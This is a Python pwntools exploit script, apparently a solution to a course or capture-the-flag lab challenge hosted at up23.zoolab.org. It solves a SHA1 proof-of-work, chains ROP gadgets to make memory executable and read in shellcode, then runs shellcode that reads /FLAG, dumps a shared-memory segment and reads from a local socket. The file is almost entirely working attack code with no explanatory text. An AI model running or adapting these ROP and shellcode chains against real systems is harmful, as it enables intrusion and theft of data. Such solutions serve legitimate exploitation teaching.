import base64
import hashlib

from pwn import *


def solve(r):
    prefix = r.recvline().decode().split("'")[1]
    for i in range(1000000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest()
        if h[:6] == "000000":
            ans = str(i).encode()
            break
    print(time.time())
    r.sendlineafter(b"string S: ", base64.b64encode(ans))


def mprotect(base, code) -> str:
    ret = b""
    ret += p64(base + code.find(asm("pop rax; ret")))
    ret += p64(10)
    ret += p64(base + code.find(asm("pop rdi; ret")))
    ret += p64(base)
    ret += p64(base + code.find(asm("pop rsi; ret")))
    ret += p64(10 * 0x10000)
    ret += p64(base + code.find(asm("pop rdx; ret")))
    ret += p64(7)
    ret += p64(base + code.find(asm("syscall; ret")))
    return ret


def exe(base, code) -> str:
    ret = b""
    ret += p64(base + code.find(asm("pop rax; ret")))
    ret += p64(0)
    ret += p64(base + code.find(asm("pop rdi; ret")))
    ret += p64(0)
    ret += p64(base + code.find(asm("pop rsi; ret")))
    ret += p64(base)
    ret += p64(base + code.find(asm("pop rdx; ret")))
    ret += p64(0x100)
    ret += p64(base + code.find(asm("syscall; ret")))
    ret += p64(base)
    return ret


def run(sc: str) -> None:
    payload = mprotect(base, code) + exe(base, code)
    r.sendline(payload)
    r.sendline(asm(sc))
    print(r.recvline().strip().decode())
    print(r.recvline().strip(b"\x00").strip().decode())
    print(r.recvline().strip(b"\x00").strip().decode())
    print(r.recvline().strip(b"\x00").strip().decode())


context.arch = "amd64"
context.os = "linux"
r = remote("up23.zoolab.org", 10494)
solve(r)

r.recvuntil(b"Timestamp is ")
timestamp = r.recvline().decode().strip()
r.recvuntil(b"Random bytes generated at ")
base = int(r.recvline().decode().strip(), 16)

code = bytearray.fromhex(os.popen(f"./codegen {timestamp}").read())

payload = b""
payload += p64(base + code.find(asm("pop rax; ret")))
payload += p64(60)
payload += p64(base + code.find(asm("pop rdi; ret")))
payload += p64(37)
payload += p64(base + code.find(asm("syscall; ret")))
r.recvuntil(b"shell>").decode()
r.sendline(payload)
print("shell>", r.recvline().strip().decode())
print(r.recvline().strip().decode())

run(shellcraft.amd64.linux.cat("/FLAG", 1))

shm_sc = """
    mov rax,29
    mov rdi,0x1337
    mov rsi,0
    mov rdx,4096
    syscall

    mov rdi,rax
    mov rax,30
    mov rsi,0
    mov rdx,4096
    syscall

    mov rsi,rax
    mov rax,1
    mov rdi,1
    mov rdx,0x80
    syscall

    mov rdi,37
    mov rax,60
    syscall
    """

run(shm_sc)

sc = (
    shellcraft.amd64.linux.connect("localhost", 0x1337, "ipv4")
    + shellcraft.amd64.linux.read(3, "rsp", 0x100)
    + shellcraft.amd64.linux.write(1, "rsp", 0x100)
)
run(sc)

r.interactive()
